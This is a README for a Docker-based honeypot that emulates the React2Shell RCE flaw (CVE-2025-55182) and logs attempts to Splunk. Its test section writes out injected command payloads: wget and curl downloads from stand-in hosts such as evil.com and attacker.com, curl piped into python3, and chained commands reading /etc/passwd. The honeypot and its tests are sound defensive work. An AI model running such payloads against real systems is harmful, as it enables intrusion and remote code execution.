#React2Shell Honeypot (CVE-2025-55182)A low-interaction, high-fidelity honeypot designed to detect and log exploitation attempts targeting **CVE-2025-55182 (React2Shell)**, a critical Remote Code Execution vulnerability in Next.js/React Server Components.

##‚ö†Ô∏è Disclaimer**This software is for educational and research purposes only.**
While this honeypot is designed to be secure by using emulation rather than actual execution, **never deploy this on your internal corporate network or home LAN.** Use a strictly isolated environment (e.g., a cloud VPS with no sensitive data or SSH keys).

---

##üõ°Ô∏è Security Architecture* **No Code Execution:** The script uses Regex to parse incoming payloads. It extracts commands (like `wget`) as strings but **never executes them**.
* **Defanged Logs:** Malicious URLs captured are automatically "defanged" (e.g., `http` -> `hxxp`).
* **Container Hardening:** Runs with a read-only filesystem and drops all root capabilities.
* **JSON Logging:** Outputs structured JSON logs suitable for SIEM ingestion.

---

##üõ†Ô∏è Installation Guide###1. Update System & Install Docker```bash
sudo apt-get update
sudo apt-get install -y docker.io python3-pip

```

###2. Create Project Directory```bash
mkdir -p ~/react2shell_honey/logs
cd ~/react2shell_honey

```

###3. Create the Honeypot Script (`app.py`)```bash
app.py from this repository

###4. Create `Dockerfile````bash
nano Dockerfile

```

*Add:*

```dockerfile
FROM python:3.9-slim

WORKDIR /app

# Install both required libraries
RUN pip install flask python-json-logger

COPY app.py .

# Expose 8080
EXPOSE 8080

# Prevent Python from crashing on read-only filesystems
ENV PYTHONDONTWRITEBYTECODE=1

CMD ["python", "app.py"]

```

---

##üèóÔ∏è Build & Deploy###1. Build the Image```bash
sudo docker build -t react2shell-honey .

```

###2. Prepare Log File Permissions (Critical)Before running, create the log file on the host so the container has permission to write to it.

```bash
touch logs/honeypot.json
chmod 666 logs/honeypot.json

```

###3. Run the Container
We run on Port **8080** to avoid conflicts with existing services.

```bash
sudo docker run -d \
  -p 8080:8080 \
  -v $(pwd)/logs:/var/log \
  --read-only \
  --cap-drop=ALL \
  --env PYTHONDONTWRITEBYTECODE=1 \
  --name react_honey \
  react2shell-honey

```

---

##üß™ VerificationTest the honeypot from a local terminal:

```bash
# 1. Test Vulnerability Probe
curl -X POST http://localhost:8080/ -d '["$1:a:a"]'
# Expected: 500 Error with E{"digest":...}

# 2. Test RCE Detection
curl -X POST http://localhost:8080/ -d '["$1:a:a"]; wget http://evil.com/malware.sh'
# Expected: Fake download progress bar

# 3. Reconnaissance (Probing)

*Tests if the "Total Probes" counter and "Geolocation" map are working in Splunk.*

```bash
# 4. Basic Port Scan (Noise)
nmap -sS -p 80,443,8080 <Target_IP>

# 5. Web Crawler / Spidering (User-Agent Testing)
curl -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" http://<Target_IP>/admin

```

# 6. Injecting a command to download a remote file
curl "http://<Target_IP>/index.php?cmd=wget http://evil.com/shell.sh"

```

**Scenario B: Alternative Download (Curl)**
*Verifies if you are detecting tools other than wget.*

```bash
# 7. Using curl with a pipe to bash
curl "http://<Target_IP>/login?user=admin&pass=; curl http://192.168.1.50/malware.py | python3"

```

**Scenario C: Chained Commands**
*Tests if the "Command" field captures the full chain.*

```bash
# Using semicolons to chain commands
curl -X POST http://<Target_IP>/api/upload -d "file=test; id; whoami; cat /etc/passwd"

```

### 3. Regex & Evasion Testing

*Tests if your new `rex` logic correctly parses tricky URLs.*

**Scenario A: Defanged URLs (hxxp)**
*Verifies the `(http|https|hxxp)` regex group.*

```bash
curl "http://<Target_IP>/?input=; wget hxxp://malware-site.com/loader.bin"

```

**Scenario B: FTP Protocol**
*Verifies the `ftp` protocol inclusion.*

```bash
curl "http://<Target_IP>/search?q=; wget ftp://10.10.10.5/payload.exe"

```

**Scenario C: Whitespace Noise (The "Split" Test)**
*Verifies that the `\S+` regex stops correctly at the whitespace.*

```bash
# The regex should grab ONLY the URL, not the trailing flags
curl "http://<Target_IP>/cmd?run=wget http://attacker.com/rootkit.tar.gz -O /tmp/evil"

```

---

### 4. Log Injection (Advanced)

*Tests if your parser can handle fake logs sent directly to the input.*

```bash
# Manually sending a JSON log to see if Splunk indexes it
echo '{"log_level": "CRITICAL", "message": "Manual Test", "ioc_extracted": "http://manual-test.com/virus"}' >> /var/log/honeypot.json

```

```

##üìä Viewing Logs```bash
tail -f logs/honeypot.json

```

##üìä Splunk
Create a new dashboard from source code.
